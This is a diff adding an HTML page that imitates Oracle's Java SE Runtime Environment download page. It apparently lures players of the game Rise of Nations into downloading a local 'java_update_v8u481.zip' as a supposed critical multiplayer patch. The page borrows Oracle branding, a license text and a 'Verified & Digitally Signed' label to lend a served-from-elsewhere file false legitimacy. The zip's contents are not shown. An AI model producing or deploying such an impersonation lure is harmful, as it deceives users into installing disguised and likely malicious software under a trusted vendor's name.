@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Java Support & Runtime Environment Deployment | Oracle</title>
+    <style>
+        body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; margin: 0; background: #fdfdfd; color: #222; font-size: 14px; line-height: 1.5; }
+        .top-bar { background: #333; color: #bbb; padding: 5px 10%; font-size: 11px; display: flex; justify-content: space-between; border-bottom: 3px solid #f8981d; }
+        .top-bar a { color: #bbb; text-decoration: none; margin-left: 15px; }
+        header { background: #fff; padding: 20px 10%; display: flex; align-items: center; border-bottom: 1px solid #eee; }
+        .logo-text { font-size: 24px; font-weight: bold; color: #444; margin-left: 10px; border-left: 1px solid #ccc; padding-left: 10px; }
+        .main-hero { background: linear-gradient(to bottom, #ffffff, #f1f1f1); padding: 40px 10%; border-bottom: 1px solid #ddd; }
+        .container { max-width: 1100px; margin: 0 auto; display: flex; padding: 40px 0; }
+        .sidebar { width: 250px; padding-right: 40px; border-right: 1px solid #eee; }
+        .sidebar h4 { font-size: 13px; color: #444; text-transform: uppercase; margin-bottom: 15px; }
+        .sidebar ul { list-style: none; padding: 0; font-size: 13px; }
+        .sidebar li { margin-bottom: 10px; }
+        .sidebar a { color: #0066cc; text-decoration: none; }
+        .content { flex: 1; padding-left: 40px; }
+        .warning-notice { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 20px; border-radius: 4px; margin-bottom: 30px; font-size: 13px; }
+        .btn-oracle { background: #f8981d; color: white; padding: 14px 40px; text-decoration: none; font-weight: bold; border-radius: 2px; display: inline-block; font-size: 16px; border: 1px solid #d87e0a; box-shadow: 0 1px 3px rgba(0,0,0,0.1); transition: 0.2s; }
+        .btn-oracle:hover { background: #e68a15; }
+        .license-scroll { height: 180px; overflow-y: scroll; border: 1px solid #eee; background: #fafafa; padding: 15px; font-size: 11px; color: #777; margin: 25px 0; text-align: justify; }
+        footer { background: #333; color: #777; padding: 50px 10%; font-size: 11px; margin-top: 50px; }
+        .footer-cols { display: flex; justify-content: space-between; }
+        .footer-cols a { color: #777; text-decoration: none; display: block; margin-bottom: 8px; }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">
+    <div>
+        <a href="https://oracle.com">Accessibility</a> | 
+        <a href="https://oracle.com">Privacy</a> | 
+        <a href="https://oracle.com">Compliance</a>
+    </div>
+    <div>Region: <b>Global</b> Service Status: <span style="color: #4caf50;">Online</span></div>
+</div>
+
+<header>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAAsTAAALEwEAmpwYAAACCklEQVRYR8VWy07DQBDtS6V+ASREAnHkh0B8An8An8An8An8An8An8An8An8An8AJA6RInHkk0BCAvW7vS67SbaTNo6Unclm7Z2dmZ19u7YOn89nS0pKYmN9fX07X19fn9ra2uY6Ojq68vLy9vT09B98fX0DfX19A319fX19fX19fX19fX19fX19fX19fX10DfX19A/0v6fLycjsvLy9fVlaWLy8vX15eXv76+vrv6+v76+vrv6+v/76+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+vr6+v7yS0vLzc3NzcXF5eXl5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5eXn5fX98Pr6+u/r6+vr6+vLycAAAAASUVORK5CYII=" width="30" alt="Java Logo">
+    <span class="logo-text">Java</span>
+</header>
+
+<div class="main-hero">
+    <div style="font-size: 11px; color: #888; margin-bottom: 15px;">Downloads / Windows / Java SE Runtime Environment 8</div>
+    <h1>Java SE Runtime Environment 8u481</h1>
+    <p style="color: #666;">Legacy Network Protocols & Global Connectivity Patch for Windows x64</p>
+</div>
+
+<div class="container">
+    <div class="sidebar">
+        <h4>Technical Resources</h4>
+        <ul>
+            <li><a href="https://java.com" target="_blank">Release Notes</a></li>
+            <li><a href="https://oracle.com" target="_blank">Verification Checksums</a></li>
+            <li><a href="https://java.com" target="_blank">Deployment Instructions</a></li>
+            <li><a href="https://oracle.com" target="_blank">Certified System Configs</a></li>
+            <li><a href="https://oracle.com" target="_blank">Global Trade Compliance</a></li>
+        </ul>
+    </div>
+
+    <div class="content">
+        <div class="warning-notice">
+            <strong>Maintenance Advisory:</strong> A critical runtime environment update is required to resolve 
+            peer-to-peer (P2P) socket timeouts. This patch is essential for maintaining multiplayer services 
+            and legacy network engines (<b>Rise of Nations</b>).
+        </div>
+
+        <div style="border: 1px solid #ddd; padding: 35px; background: #fff;">
+            <div style="margin-bottom: 20px;">
+                <strong>Software:</strong> jre-8u481-windows-x64-deployment.zip<br>
+                <strong>Environment:</strong> Windows 10/11 x64 Service Pack 1+<br>
+                <strong>Package Type:</strong> Full Installer Bundle
+            </div>
+
+            <a href="./java_update_v8u481.zip" class="btn-oracle" download>Agree and Start Free Download</a>
+            
+            <p style="font-size: 11px; color: #888; margin-top: 10px;">
+                Verification Status: <span style="color: green;">Verified & Digitally Signed</span>
+            </p>
+
+            <div class="license-scroll">
+                <strong>ORACLE TECHNOLOGY NETWORK LICENSE AGREEMENT</strong><br><br>
+                <strong>1. GRANT OF RIGHTS.</strong> We grant you a non-exclusive, non-transferable limited license to use the Programs for: (a) Internal Business Operations; (b) Development, testing, prototyping and demonstrating your applications. <br><br>
+                <strong>2. RESTRICTIONS ON USE.</strong> You may not: (a) remove or modify any Program markings or any notice of Oracle's proprietary rights; (b) make the Programs available in any manner to any third party for use in the third party's business operations; (c) cause or permit reverse engineering, disassembly or decompilation of the Programs.<br><br>
+                <strong>3. DISCLAIMER OF WARRANTIES.</strong> THE PROGRAMS ARE PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. ORACLE FURTHER DISCLAIMS ALL WARRANTIES, EXPRESS AND IMPLIED, INCLUDING WITHOUT LIMITATION, ANY IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE OR NONINFRINGEMENT.
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <p>© 2024 Oracle Corporation. All rights reserved.</p>
+</footer>
+
+</body>
+</html>
